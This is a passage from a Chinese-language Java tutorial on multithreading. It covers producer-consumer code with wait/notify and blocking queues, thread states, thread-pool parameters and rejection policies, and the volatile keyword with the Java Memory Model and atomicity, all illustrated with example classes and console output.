            //2. synchronized 锁,锁对象要唯一
            //3. 判断,共享数据是否结束. 结束
            //4. 判断,共享数据是否结束. 没有结束
        while(true){
            synchronized (desk.getLock()){
                if(desk.getCount() == 0){
                    break;
                }else{
                    //System.out.println("验证一下是否执行了");
                    if(desk.isFlag()){
                        //有
                        System.out.println("吃货在吃汉堡包");
                        desk.setFlag(false);
                        desk.getLock().notifyAll();
                        desk.setCount(desk.getCount() - 1);
                    }else{
                        //没有就等待
                        //使用什么对象当做锁,那么就必须用这个对象去调用等待和唤醒的方法.
                        try {
                            desk.getLock().wait();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }

    }
}

public class Demo {
    public static void main(String[] args) {
        /*消费者步骤：
        1，判断桌子上是否有汉堡包。
        2，如果没有就等待。
        3，如果有就开吃
        4，吃完之后，桌子上的汉堡包就没有了
                叫醒等待的生产者继续生产
        汉堡包的总数量减一*/

        /*生产者步骤：
        1，判断桌子上是否有汉堡包
        如果有就等待，如果没有才生产。
        2，把汉堡包放在桌子上。
        3，叫醒等待的消费者开吃。*/

        Desk desk = new Desk();

        Foodie f = new Foodie(desk);
        Cooker c = new Cooker(desk);

        f.start();
        c.start();

    }
}
```

##### 11.7.4 阻塞队列基本使用

- 阻塞队列继承结构

![image-20240208181132681](./img/小米虫爬山路-img/image-20240208181132681.png)

+ 常见BlockingQueue:

  ArrayBlockingQueue: 底层是数组,有界

  LinkedBlockingQueue: 底层是链表,无界.但不是真正的无界,最大为int的最大值

+ BlockingQueue的核心方法:

  put(anObject): 将参数放入队列,如果放不进去会阻塞

  take(): 取出第一个数据,取不到会阻塞

+ 代码示例

```java
public class Demo02 {
    public static void main(String[] args) throws Exception {
        // 创建阻塞队列的对象,容量为 1
        ArrayBlockingQueue<String> arrayBlockingQueue = new ArrayBlockingQueue<>(1);

        // 存储元素
        arrayBlockingQueue.put("汉堡包");

        // 取元素
        System.out.println(arrayBlockingQueue.take());
        System.out.println(arrayBlockingQueue.take()); // 取不到会阻塞

        System.out.println("程序结束了");
    }
}
```

##### 11.7.5 阻塞队列实现等待唤醒机制

+ 案例需求

  + 生产者类(Cooker)：实现Runnable接口，重写run()方法，设置线程任务

    1.构造方法中接收一个阻塞队列对象

    2.在run方法中循环向阻塞队列中添加包子

    3.打印添加结果

  + 消费者类(Foodie)：实现Runnable接口，重写run()方法，设置线程任务

    1.构造方法中接收一个阻塞队列对象

    2.在run方法中循环获取阻塞队列中的包子

    3.打印获取结果

  + 测试类(Demo)：里面有main方法，main方法中的代码步骤如下

    创建阻塞队列对象

    创建生产者线程和消费者线程对象,构造方法中传入阻塞队列对象

    分别开启两个线程

+ 代码实现

```java
public class Cooker extends Thread {

    private ArrayBlockingQueue<String> bd;

    public Cooker(ArrayBlockingQueue<String> bd) {
        this.bd = bd;
    }
//    生产者步骤：
//            1，判断桌子上是否有汉堡包
//    如果有就等待，如果没有才生产。
//            2，把汉堡包放在桌子上。
//            3，叫醒等待的消费者开吃。

    @Override
    public void run() {
        while (true) {
            try {
                bd.put("汉堡包");
                System.out.println("厨师放入一个汉堡包");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}

public class Foodie extends Thread {
    private ArrayBlockingQueue<String> bd;

    public Foodie(ArrayBlockingQueue<String> bd) {
        this.bd = bd;
    }

    @Override
    public void run() {
//        1，判断桌子上是否有汉堡包。
//        2，如果没有就等待。
//        3，如果有就开吃
//        4，吃完之后，桌子上的汉堡包就没有了
//                叫醒等待的生产者继续生产
//        汉堡包的总数量减一

        //套路:
        //1. while(true)死循环
        //2. synchronized 锁,锁对象要唯一
        //3. 判断,共享数据是否结束. 结束
        //4. 判断,共享数据是否结束. 没有结束
        while (true) {
            try {
                String take = bd.take();
                System.out.println("吃货将" + take + "拿出来吃了");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }
}

public class Demo {
    public static void main(String[] args) {
        ArrayBlockingQueue<String> bd = new ArrayBlockingQueue<>(1);

        Foodie f = new Foodie(bd);
        Cooker c = new Cooker(bd);

        f.start();
        c.start();
    }
}
```

#### 11.8 线程状态

当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。线程对象在不同的时期有不同的状态。那么Java中的线程存在哪几种状态呢？Java中的线程

状态被定义在了java.lang.Thread.State枚举类中，State枚举类的源码如下：

```java
public class Thread {
    
    public enum State {
    
        /* 新建 */
        NEW , 

        /* 可运行状态 */
        RUNNABLE , 

        /* 阻塞状态 */
        BLOCKED , 

        /* 无限等待状态 */
        WAITING , 

        /* 计时等待 */
        TIMED_WAITING , 

        /* 终止 */
        TERMINATED;
    
	}
    
    // 获取当前线程的状态
    public State getState() {
        return jdk.internal.misc.VM.toThreadState(threadStatus);
    }
    
}
```

通过源码我们可以看到Java中的线程存在6种状态，每种线程状态的含义如下

| 线程状态      | 具体含义                                                     |
| ------------- | ------------------------------------------------------------ |
| NEW           | 一个尚未启动的线程的状态。也称之为初始状态、开始状态。线程刚被创建，但是并未启动。还没调用start方法。MyThread t = new MyThread()只有线程象，没有线程特征。 |
| RUNNABLE      | 当我们调用线程对象的start方法，那么此时线程对象进入了RUNNABLE状态。那么此时才是真正的在JVM进程中创建了一个线程，线程一经启动并不是立即得到执行，线程的运行与否要听令与CPU的调度，那么我们把这个中间状态称之为可执行状态(RUNNABLE)也就是说它具备执行的资格，但是并没有真正的执行起来而是在等待CPU的度。 |
| BLOCKED       | 当一个线程试图获取一个对象锁，而该对象锁被其他的线程持有，则该线程进入Blocked状态；当该线程持有锁时，该线程将变成Runnable状态。 |
| WAITING       | 一个正在等待的线程的状态。也称之为等待状态。造成线程等待的原因有两种，分别是调用Object.wait()、join()方法。处于等待状态的线程，正在等待其他线程去执行一个特定的操作。例如：因为wait()而等待的线程正在等待另一个线程去调用notify()或notifyAll()；一个因为join()而等待的线程正在等待另一个线程结束。 |
| TIMED_WAITING | 一个在限定时间内等待的线程的状态。也称之为限时等待状态。造成线程限时等待状态的原因有三种，分别是：Thread.sleep(long)，Object.wait(long)、join(long)。 |
| TERMINATED    | 一个完全运行完成的线程的状态。也称之为终止状态、结束状态     |

各个状态的转换，如下图所示：

![image-20240209212634373](./img/小米虫爬山路-img/image-20240209212634373.png)

#### 11.9 线程池

##### 11.9.1 线程池-基本原理

**概述 :** 

提到池，大家应该能想到的就是水池。水池就是一个容器，在该容器中存储了很多的水。那么什么是线程池呢？线程池也是可以看做成一个池子，在该池子中存储很多个线程。

线程池存在的意义：

==**系统创建一个线程的成本是比较高的**==，因为它涉及到与操作系统交互，当程序中需要创建大量生存期很短暂的线程时，频繁的创建和销毁线程对系统的资源消耗有可能大于业务处理是对系

统资源的消耗，这样就有点"舍本逐末"了。针对这一种情况，为了提高性能，我们就可以采用线程池。线程池在启动的时，会创建大量空闲线程，当我们向线程池提交任务的时，线程池就

会启动一个线程来执行该任务。等待任务执行完毕以后，线程并不会死亡，而是再次返回到线程池中称为空闲状态。等待下一次任务的执行。

**线程池的设计思路 :**

1. 准备一个任务容器
2. 一次性启动多个(2个)消费者线程
3. 刚开始任务容器是空的，所以线程都在wait
4. 直到一个外部线程向这个任务容器中扔了一个"任务"，就会有一个消费者线程被唤醒
5. 这个消费者线程取出"任务"，并且执行这个任务，执行完毕后，继续等待下一次任务的到来

##### 11.9.2 线程池-Executors默认线程池

概述 : JDK对线程池也进行了相关的实现，在真实企业开发中我们也很少去自定义线程池，而是使用JDK中自带的线程池。

我们可以使用Executors中所提供的**静态**方法来创建线程池

```java
static ExecutorService newCachedThreadPool()   创建一个默认的线程池（最多可以有21亿个线程）
static newFixedThreadPool(int nThreads)	    创建一个指定最多线程数量的线程池
```

**代码实现 :** 

```java
package com.itheima.mythreadpool;


//static ExecutorService newCachedThreadPool()   创建一个默认的线程池
//static newFixedThreadPool(int nThreads)	    创建一个指定最多线程数量的线程池

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MyThreadPoolDemo {
    public static void main(String[] args) throws InterruptedException {

        //1,创建一个默认的线程池对象.池子中默认是空的.默认最多可以容纳int类型的最大值.
        ExecutorService executorService = Executors.newCachedThreadPool();
        //Executors --- 可以帮助我们创建线程池对象
        //ExecutorService --- 可以帮助我们控制线程池

        executorService.submit(()->{
            System.out.println(Thread.currentThread().getName() + "在执行了");
        });

        //Thread.sleep(2000);

        executorService.submit(()->{
            System.out.println(Thread.currentThread().getName() + "在执行了");
        });

        executorService.shutdown();
    }
}
```

##### 11.9.3 线程池-Executors创建指定上限的线程池

**使用Executors中所提供的静态方法来创建线程池**

​	static ExecutorService newFixedThreadPool(int nThreads) : 创建一个指定最多线程数量的线程池

**代码实现 :** 

```java
package com.itheima.mythreadpool;

//static ExecutorService newFixedThreadPool(int nThreads)
//创建一个指定最多线程数量的线程池

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;

public class MyThreadPoolDemo2 {
    public static void main(String[] args) {
        //参数不是初始值而是最大值
        ExecutorService executorService = Executors.newFixedThreadPool(10);

        ThreadPoolExecutor pool = (ThreadPoolExecutor) executorService;
        System.out.println(pool.getPoolSize());//0

        executorService.submit(()->{
            System.out.println(Thread.currentThread().getName() + "在执行了");
        });

        executorService.submit(()->{
            System.out.println(Thread.currentThread().getName() + "在执行了");
        });

        System.out.println(pool.getPoolSize());//2
//        executorService.shutdown();
    }
}

```

##### 11.9.4 线程池-ThreadPoolExecutor

**创建线程池对象 :** 

ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(核心线程数量,最大线程数量,空闲线程最大存活时间,任务队列,创建线程工厂,任务的拒绝策略);

**代码实现 :** 

```java
package com.itheima.mythreadpool;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class MyThreadPoolDemo3 {
//    参数一：核心线程数量
//    参数二：最大线程数
//    参数三：空闲线程最大存活时间
//    参数四：时间单位
//    参数五：任务队列
//    参数六：创建线程工厂
//    参数七：任务的拒绝策略
    public static void main(String[] args) {
        ThreadPoolExecutor pool = new ThreadPoolExecutor(2,5,2,TimeUnit.SECONDS,new ArrayBlockingQueue<>(10), Executors.defaultThreadFactory(),new ThreadPoolExecutor.AbortPolicy());
        pool.submit(new MyRunnable());
        pool.submit(new MyRunnable());

        pool.shutdown();
    }
}
```

==**注意：除了核心线程的线程都是临时线程，并且临时线程是在核心线程在工作并且任务队列是满的而且还有剩余的任务的情况下去创建的。**==

##### 11.9.5 线程池-参数详解

![image-20240210161623127](./img/小米虫爬山路-img/image-20240210161623127.png)

```java
public ThreadPoolExecutor(int corePoolSize,
                              int maximumPoolSize,
                              long keepAliveTime,
                              TimeUnit unit,
                              BlockingQueue<Runnable> workQueue,
                              ThreadFactory threadFactory,
                              RejectedExecutionHandler handler)
    
corePoolSize：   核心线程的最大值，不能小于0
maximumPoolSize：最大线程数，不能小于等于0，maximumPoolSize >= corePoolSize
keepAliveTime：  空闲线程最大存活时间,不能小于0
unit：           时间单位
workQueue：      任务队列，不能为null
threadFactory：  创建线程工厂,不能为null      
handler：        任务的拒绝策略,不能为null  
```

##### 11.9.6 线程池-非默认任务拒绝策略

RejectedExecutionHandler是jdk提供的一个任务拒绝策略接口，它下面存在4个子类。

```java
ThreadPoolExecutor.AbortPolicy: 		    丢弃任务并抛出RejectedExecutionException异常。是默认的策略。
ThreadPoolExecutor.DiscardPolicy： 		   丢弃任务，但是不抛出异常 这是不推荐的做法。
ThreadPoolExecutor.DiscardOldestPolicy：    抛弃队列中等待最久的任务 然后把当前任务加入队列中。
ThreadPoolExecutor.CallerRunsPolicy:        调用任务的run()方法绕过线程池直接执行。
```

注：明确线程池最多可执行的任务数 = 队列容量 + 最大线程数

**案例演示1**：演示ThreadPoolExecutor.AbortPolicy任务处理策略

```java
public class ThreadPoolExecutorDemo01 {

    public static void main(String[] args) {

        /**
         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s
         */
        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,
                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.AbortPolicy()) ;

        // 提交5个任务，而该线程池最多可以处理4个任务，当我们使用AbortPolicy这个任务处理策略的时候，就会抛出异常
        for(int x = 0 ; x < 5 ; x++) {
            threadPoolExecutor.submit(() -> {
                System.out.println(Thread.currentThread().getName() + "---->> 执行了任务");
            });
        }
    }
}
```

**控制台输出结果**

```java
pool-1-thread-1---->> 执行了任务
pool-1-thread-3---->> 执行了任务
pool-1-thread-2---->> 执行了任务
pool-1-thread-3---->> 执行了任务
```

控制台报错，仅仅执行了4个任务，有一个任务被丢弃了

**案例演示2**：演示ThreadPoolExecutor.DiscardPolicy任务处理策略

```java
public class ThreadPoolExecutorDemo02 {
    public static void main(String[] args) {
        /**
         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s
         */
        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,
                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.DiscardPolicy()) ;

        // 提交5个任务，而该线程池最多可以处理4个任务，当我们使用DiscardPolicy这个任务处理策略的时候，控制台不会报错
        for(int x = 0 ; x < 5 ; x++) {
            threadPoolExecutor.submit(() -> {
                System.out.println(Thread.currentThread().getName() + "---->> 执行了任务");
            });
        }
    }
}
```

**控制台输出结果**

```java
pool-1-thread-1---->> 执行了任务
pool-1-thread-1---->> 执行了任务
pool-1-thread-3---->> 执行了任务
pool-1-thread-2---->> 执行了任务
```

控制台没有报错，仅仅执行了4个任务，有一个任务被丢弃了



**案例演示3**：演示ThreadPoolExecutor.DiscardOldestPolicy任务处理策略

```java
public class ThreadPoolExecutorDemo02 {
    public static void main(String[] args) {
        /**
         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s
         */
        ThreadPoolExecutor threadPoolExecutor;
        threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,
                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.DiscardOldestPolicy());
        // 提交5个任务
        for(int x = 0 ; x < 5 ; x++) {
            // 定义一个变量，来指定指定当前执行的任务;这个变量需要被final修饰
            final int y = x ;
            threadPoolExecutor.submit(() -> {
                System.out.println(Thread.currentThread().getName() + "---->> 执行了任务" + y);
            });     
        }
    }
}
```

**控制台输出结果**

```java
pool-1-thread-2---->> 执行了任务2
pool-1-thread-1---->> 执行了任务0
pool-1-thread-3---->> 执行了任务3
pool-1-thread-1---->> 执行了任务4
```

由于任务1在线程池中等待时间最长，因此任务1被丢弃。



**案例演示4**：演示ThreadPoolExecutor.CallerRunsPolicy任务处理策略

```java
public class ThreadPoolExecutorDemo04 {
    public static void main(String[] args) {

        /**
         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s
         */
        ThreadPoolExecutor threadPoolExecutor;
        threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,
                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.CallerRunsPolicy());

        // 提交5个任务
        for(int x = 0 ; x < 5 ; x++) {
            threadPoolExecutor.submit(() -> {
                System.out.println(Thread.currentThread().getName() + "---->> 执行了任务");
            });
        }
    }
}
```

**控制台输出结果**

```java
pool-1-thread-1---->> 执行了任务
pool-1-thread-3---->> 执行了任务
pool-1-thread-2---->> 执行了任务
pool-1-thread-1---->> 执行了任务
main---->> 执行了任务
```

通过控制台的输出，我们可以看到次策略没有通过线程池中的线程执行任务，而是直接调用任务的run()方法绕过线程池直接执行。

#### 11.10 关键字volatile

##### 11.10.1 看程序说结果

分析如下程序，说出在控制台的输出结果。

Thread的子类

```java
public class VolatileThread extends Thread {

    // 定义成员变量
    private boolean flag = false ;
    public boolean isFlag() { return flag;}

    @Override
    public void run() {

        // 线程休眠1秒
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // 将flag的值更改为true
        this.flag = true ;
        System.out.println("flag=" + flag);

    }
}
```

测试类

```java
public class VolatileThreadDemo01 {
    
    public static void main(String[] args) {

        // 创建VolatileThread线程对象
        VolatileThread volatileThread = new VolatileThread() ;
        volatileThread.start();

        // 在main线程中获取开启的线程中flag的值
        while(true) {
            System.out.println("main线程中获取开启的线程中flag的值为" + volatileThread.isFlag());
        }
        
    }
}
```

控制台输出结果

```java
前面是false，过了一段时间之后就变成了true
```

按照我们的分析，当我们把volatileThread线程启动起来以后，那么volatileThread线程开始执行。在volatileThread线程的run方法中，线程休眠1s，休眠一秒以后那么flag的值应该为true，此时我们在主线程中不停的获取flag的值。发现前面释放false，后面是true信息，那么这是为什么呢？要想知道原因，那么我们就需要学习一下JMM。

##### 11.10.2 JMM

概述：JMM(Java Memory Model)Java内存模型,是java虚拟机规范中所定义的一种内存模型。

Java内存模型(Java Memory Model)描述了Java程序中各种变量(线程共享变量)的访问规则，以及在JVM中将变量存储到内存和从内存中读取变量这样的底层细节。

特点：

1. 所有的共享变量都存储于主内存(计算机的RAM)这里所说的变量指的是实例变量和类变量。不包含局部变量，因为局部变量是线程私有的，因此不存在竞争问题。

2. 每一个线程还存在自己的工作内存，线程的工作内存，保留了被线程使用的变量的工作副本。

3. 线程对变量的所有的操作(读，写)都必须在工作内存中完成，而不能直接读写主内存中的变量，不同线程之间也不能直接访问对方工作内存中的变量，线程间变量的值的传递需要通过主内存完成。


![1571743818653](./img/小米虫爬山路-img/1571743818653.png) 

##### 11.10.3 问题分析

了解了一下JMM,那么接下来我们就来分析一下上述程序产生问题的原因。

![1571744627663](./img/小米虫爬山路-img/1571744627663.png)  

产生问题的流程分析：

1. VolatileThread线程从主内存读取到数据放入其对应的工作内存

2. 将flag的值更改为true，但是这个时候flag的值还没有回写主内存

3. 此时main线程读取到了flag的值并将其放入到自己的工作内存中，此时flag的值为false

4. VolatileThread线程将flag的值写回到主内存，但是main函数里面的while(true)调用的是系统比较底层的代码，速度快，快到没有时间再去读取主内存中的值，所以while(true)读取到的值一直是false。(如果有一个时刻main线程从主内存中读取到了flag的最新值，那么if语句就可以执行，main线程何时从主内存中读取最新的值，我们无法控制)


我们可以让主线程执行慢一点，执行慢一点以后，在某一个时刻，可能就会读取到主内存中最新的flag的值，那么if语句就可以进行执行。

测试类

```java
public class VolatileThreadDemo02 {

    public static void main(String[] args) throws InterruptedException {

        // 创建VolatileThread线程对象
        VolatileThread volatileThread = new VolatileThread() ;
        volatileThread.start();

        // main方法
        while(true) {
            if(volatileThread.isFlag()) {
                System.out.println("执行了======");
            }

            // 让线程休眠100毫秒
            TimeUnit.MILLISECONDS.sleep(100);
        }

    }
}
```

控制台输出结果

```java
flag=true
执行了======
执行了======
执行了======
....
```

此时我们可以看到if语句已经执行了。当然我们在真实开发中可能不能使用这种方式来处理这个问题，那么这个问题应该怎么处理呢？我们就需要学习下一小节的内容。

##### 11.10.4 问题处理

==**加锁**==

第一种处理方案，我们可以通过加锁的方式进行处理。

测试类

```java
public class VolatileThreadDemo03 {

    public static void main(String[] args) throws InterruptedException {

        // 创建VolatileThread线程对象
        VolatileThread volatileThread = new VolatileThread() ;
        volatileThread.start();

        // main方法
        while(true) {

            // 加锁进行问题处理
            synchronized (volatileThread) {
                if(volatileThread.isFlag()) {
                    System.out.println("执行了======");
                }
            }

        }

    }
}
```

控制台输出结果

```java
flag=true
执行了======
执行了======
执行了======
....
```



工作原理说明

对上述代码加锁完毕以后，某一个线程支持该程序的过程如下：

a.线程获得锁

b.清空工作内存

c.从主内存拷贝共享变量最新的值到工作内存成为副本

d.执行代码

e.将修改后的副本的值刷新回主内存中

f.线程释放锁

==**volatile关键字**==

第二种处理方案，我们可以通过volatile关键字来修饰flag变量。

线程类

```java
public class VolatileThread extends Thread {

    // 定义成员变量
    private volatile boolean flag = false ;
    public boolean isFlag() { return flag;}

    @Override
    public void run() {

        // 线程休眠1秒
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // 将flag的值更改为true
        this.flag = true ;
        System.out.println("flag=" + flag);

    }
}
//--------------------------------更新之后的案例-------------------------------------------
public class VolatileTest extends Thread{
    boolean flag = false;
    int i = 0;

    public void run() {
        while (!flag) {
            i++;
        }
        System.out.println("stope" + i);
    }

    public static void main(String[] args) throws Exception {
        VolatileTest vt = new VolatileTest();
        vt.start();

        Thread.sleep(10);
        vt.flag = true;

    }
}
```

控制台输出结果

```java
flag=true
执行了======
执行了======
执行了======
....
```



工作原理说明

![1571746088704](./img/小米虫爬山路-img/1571746088704.png) 

执行流程分析

1. VolatileThread线程从主内存读取到数据放入其对应的工作内存
2. 将flag的值更改为true，但是这个时候flag的值还没有回写主内存
3. 此时main线程读取到了flag的值并将其放入到自己的工作内存中，此时flag的值为false
4. VolatileThread线程将flag的值写到主内存
5. main线程工作内存中的flag变量副本失效
6. main线程再次使用flag时，main线程会从主内存读取最新的值，放入到工作内存中，然后在进行使用



总结： volatile保证不同线程对共享变量操作的可见性，也就是说一个线程修改了volatile修饰的变量，当修改写回主内存时，另外一个线程立即看到最新的值。

​      但是volatile不保证原子性(关于原子性问题，我们在下面的小节中会介绍)。



volatile与synchronized的区别：

1. volatile只能修饰实例变量和类变量，而synchronized可以修饰方法，以及代码块。

2. volatile保证数据的可见性，但是不保证原子性(多线程进行写操作，不保证线程安全);而synchronized是一种排他（互斥）的机制(因此有时我们也将synchronized这种锁称之为排他（互斥）锁)，synchronized修饰的代码块，被修饰的代码块称之为同步代码块，无法被中断可以保证原子性，也可以间接的保证可见性。

#### 11.11 原子性

概述：所谓的原子性是指在一次操作或者多次操作中，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行，多个操作是一个不可以分割的整体。（有点像数据库的事物）

//比如说：你喂你女朋友吃冰淇淋，如果没有女朋友，你就假想一下，实在不行，你就喂你旁边的哥们吃一口冰淇淋。这就是一个不可分割的整体，一个是你喂，一个是她吃。这就是一个整体，如果没有她吃，那么你喂就没有意义，如果没有你喂，她吃就没有意义。

//比如：从张三的账户给李四的账户转1000元，这个动作将包含两个基本的操作：从张三的账户扣除1000元，给李四的账户增加1000元。这两个操作必须符合原子性的要求，要么都成功要么都失败。

##### 11.11.1 看程序说结果

分析如下程序的执行结果

线程类

```java
public class VolatileAtomicThread implements Runnable {

    // 定义一个int类型的变量
    private int count = 0 ;

    @Override
    public void run() {
        
        // 对该变量进行++操作，100次
        for(int x = 0 ; x < 100 ; x++) {
            count++ ;					
            System.out.println("冰淇淋的个数 =========>>>> " + count);
        }
        
    }

}
```

测试类

```java
public class VolatileAtomicThreadDemo {

    public static void main(String[] args) {

        // 创建VolatileAtomicThread对象
        VolatileAtomicThread volatileAtomicThread = new VolatileAtomicThread() ;

        // 开启100个线程对count进行++操作
        for(int x = 0 ; x < 100 ; x++) {
            new Thread(volatileAtomicThread).start();
        }
        
    }

}
```

程序分析：我们在主线程中通过for循环启动了100个线程，每一个线程都会对VolatileAtomicThread类中的count加100次。那么直接结果应该是10000。但是真正的执行结果和我们分析

的是否一样呢？运行程序(多运行几次)，查看控制台输出结果

```java
....
count =========>>>> 9997
count =========>>>> 9998
count =========>>>> 9999
```

通过控制台的输出，我们可以看到最终count的结果可能并不是10000。接下来我们就来分析一下问题产生的原因。

##### 11.11.2 问题分析说明

以上问题主要是发生在count++操作上：

count++操作包含3个步骤：

- 从主内存中读取数据到工作内存
- 对工作内存中的数据进行++操作
- 将工作内存中的数据写回到主内存

count++操作不是一个原子性操作，也就是说在某一个时刻对某一个操作的执行，有可能被其他的线程打断。

![1571794778139](./img/小米虫爬山路-img/1571794778139.png) 

产生问题的执行流程分析：

1. 假设此时count的值是100，线程A需要对改变量进行自增1的操作，首先它需要从主内存中读取变量count的值。由于CPU的切换关系，此时CPU的执行权被切换到了B线程。A线程就处

   于就绪状态，B线程处于运行状态。

2. 线程B也需要从主内存中读取count变量的值,由于线程A没有对count值做任何修改因此此时B读取到的数据还是100

3. 线程B工作内存中对count执行了+1操作，但是未刷新之主内存中

4. 此时CPU的执行权切换到了A线程上，由于此时线程B没有将工作内存中的数据刷新到主内存，因此A线程工作内存中的变量值还是100，没有失效。A线程对工作内存中的数据进行了+1操作。

5. 线程B将101写入到主内存

6. 线程A将101写入到主内存

虽然计算了2次，但是只对A进行了1次修改。

##### 11.11.3 volatile原子性测试

我们刚才说到了volatile在多线程环境下只保证了共享变量在多个线程间的可见性，但是不保证原子性。那么接下来我们就来做一个测试。测试的思想，就是使用volatile修饰count。

线程类

```java
public class VolatileAtomicThread implements Runnable {

    // 定义一个int类型的变量,并且使用volatile修饰
    private volatile int count = 0 ;

    @Override
    public void run() {
        
        // 对该变量进行++操作，100次
        for(int x = 0 ; x < 100 ; x++) {
            count++ ;					
            System.out.println("count =========>>>> " + count);
        }
        
    }

}
```

控制台输出结果(需要运行多次)

```java
...
count =========>>>> 9997
count =========>>>> 9998
count =========>>>> 9999
```

通过控制台结果的输出，我们可以看到程序还是会出现问题。因此也就证明volatile关键字是不保证原子性的。

##### 11.11.4 volatile使用场景

volatile关键字不保证原子性操作，那么同学们可能会存在一些疑问，volatile关键字在什么情况下进行使用呢？这里我们举两个基本的使用场景。

==**状态标志**==

比如现在存在一个线程不断向控制台输出一段话"传智播客中国IT教育的标杆....",当这个线程执行5秒以后，将该线程结束。

实现思路：定义一个boolean类型的变量，这个变量就相当于一个标志。当这个变量的值为true的时候，线程一直执行，10秒以后我们把这个变量的值更改为false，此时结束该线程的执行。

为了保证一个线程对这个变量的修改，另外一个线程立马可以看到，这个变量就需要通过volatile关键字进行修饰。

线程类

```java
public class VolatileUseThread implements Runnable {

    // 定义标志变量
    private volatile boolean shutdown = false ;

    @Override
    public void run() {

        while(!shutdown) {
            System.out.println("传智播客中国IT教育的标杆....");
        }

    }

    // 关闭线程
    public void shutdown() {
        this.shutdown = true ;
    }

}
```

测试类

```java
public class VolatileUseThreadDemo01 {

    public static void main(String[] args) throws InterruptedException {

        // 创建线程任务类对象
        VolatileUseThread volatileUseThread = new VolatileUseThread() ;

        // 创建线程对象
        Thread thread = new Thread(volatileUseThread);

        // 启动线程
        thread.start();

        // 主线程休眠
        TimeUnit.SECONDS.sleep(5);

        // 关闭线程
        volatileUseThread.shutdown();

    }

}
```

观察控制台输出，volatileUseThread线程执行5秒以后程序结束。

==**独立观察**==

//AI养猪。。。。

//设备区测量温度

//当温度高了。。。需要给猪开空调。。。加冰棍。。。加喝的水。。。



volatile的另一种简单使用场景是：定期"发布"观察结果供程序内部使用。例如，假设有一种环境传感器能够感觉环境温度。一个后台线程可能会每隔几秒读取一次该传感器数据，并更新包

含这个volatile变量的值。然后，其他线程可以读取这个变量，从而随时能够看到最新的温度值。这种使用就是多个线程操作共享变量，但是是有一个线程对其进行写操作，其他的线程都是读。

我们可以设计一个程序，模拟上面的温度传感器案例。

实现步说明

1. 定义一个温度传感器(TemperatureSensor)的类,在该类中定义两个成员变量(temperature(温度值)，type(传感器的类型))，temperature变量需要被volatile修饰
2. 定义一个读取温度传感器的线程的任务类(ReadTemperatureRunnable)，该类需要定义一个TemperatureSensor类型的成员变量(该线程需要读取温度传感器的数据)
3. 定义一个定时采集温度的线程任务类(GatherTemperatureRunnable)，该类需要定义一个TemperatureSensor类型的成员变量(该线程需要将读到的温度设置给传感器)

4. 创建测试类(TemperatureSensorDemo)
   1. 创建TemperatureSensor对象
   2. 创建ReadTemperatureRunnable类对象，把TemperatureSensor作为构造方法的参数传递过来
   3. 创建GatherTemperatureRunnable类对象，把TemperatureSensor作为构造方法的参数传递过来
   4. 创建2个Thread对象，并启动，把第二步所创建的对象作为构造方法参数传递过来，这两个线程负责读取TemperatureSensor中的温度数据
   5. 创建1个Thread对象，并启动，把第三步所创建的对象作为构造方法参数传递过来，这个线程负责读取定时采集数据中的温度数据

TemperatureSensor类

```java
public class TemperatureSensor {        // 温度传感器类

    private volatile int temperature ;  // 温度值

    private String type ;               // 传感器的类型

    public int getTemperature() {
        return temperature;
    }

    public void setTemperature(int temperature) {
        this.temperature = temperature;
    }

    public String getType() {
        return type;
    }

    public void setType(String type) {
        this.type = type;
    }
}
```

ReadTemperatureRunnable类

```java
public class ReadTemperatureRunnable implements Runnable {

    // 温度传感器
    private TemperatureSensor temperatureSensor ;
    public ReadTemperatureRunnable(TemperatureSensor temperatureSensor) {
        this.temperatureSensor = temperatureSensor ;
    }

    @Override
    public void run() {

        // 不断的读取温度传感器中的数据
        while(true) {

            // 读取数据
            System.out.println(Thread.currentThread().getName() + "---读取到的温度数据为------>>> " + temperatureSensor.getTemperature());

            try {
                // 让线程休眠100毫秒，便于观察
                TimeUnit.MILLISECONDS.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }

    }

}
```

GatherTemperatureRunnable类

```java
public class GatherTemperatureRunnable implements Runnable {

    // 温度传感器
    private TemperatureSensor temperatureSensor ;
    public GatherTemperatureRunnable(TemperatureSensor temperatureSensor) {
        this.temperatureSensor = temperatureSensor ;
    }

    @Override
    public void run() {

        // 定义一个变量，表示环境初始温度
        int temperature = 23 ;

        // 不断进行数据采集
        while(true) {

            // 将采集到的数据设置给温度传感器
            System.out.println(Thread.currentThread().getName() + "-----采集到的数据为----->>> " + temperature);
            temperatureSensor.setTemperature(temperature);

            try {
